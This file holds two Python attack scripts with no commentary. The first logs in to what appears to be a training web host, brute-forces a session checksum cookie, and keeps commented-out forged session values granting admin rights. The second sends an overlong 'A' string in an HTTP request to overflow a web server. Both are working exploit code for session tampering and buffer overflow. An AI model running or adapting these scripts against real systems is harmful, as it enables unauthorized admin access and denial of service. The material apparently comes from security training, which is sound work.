import requests

url = "https://xszacsko.bit.demo-cert.sk/backend.php"

# Set the login data
login_data = {
    "action": "login",
    "login": "bit",
    "password": "bit"
}

with requests.Session() as session:
    response = session.post(url, data=login_data)
    cookie = session.cookies.get_dict()

print("Cookie:", cookie)
results = []

for i in range(1000):
    #increment the sess_cum cookie value

    #cookie["sess"] = "Tzo4OiJzdGRDbGFzcyI6NDp7czoyOiJpZCI7aToxMztzOjU6ImxvZ2luIjtzOjM6ImJpdCI7czo4OiJwYXNzd29yZCI7czozOiJiaXQiO3M6ODoiaXNfYWRtaW4iO2I6MTt9"
    #cookie["sess"] = "Tzo4OiJzdGRDbGFzcyI6NDp7czoyOiJpZCI7aToxO3M6NToibG9naW4iO3M6NToiam96a28iO3M6ODoicGFzc3dvcmQiO3M6Njoia3Jlc2xvIjtzOjg6ImlzX2FkbWluIjtiOjE7fQ=="
    cookie["sess_csum"] = str(i)
    response = requests.get(url, cookies=cookie)
    curr_cookie = "checksum {}: {}".format(i, response.content)

    print(curr_cookie)

    results.append(curr_cookie)

print(results)




import os
import sys
import socket

def main(argv):
    argc = len(argv)

    if argc != 3:
        print("usage: %s " % (argv[0]))
        sys.exit(0)

    host = argv[1]
    port = int(argv[2])

    print("[*] target: %s:%d" % (host, port))

    payload = "A" * 257 + "/index.html HTTP/1.1\r\n\r\n"

    print("[*] payload: %s" % (payload))

    sd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sd.connect((host, port))
    sd.send(payload)
    sd.close()

if __name__ == "__main__":
    main(sys.argv)
    sys.exit(0)
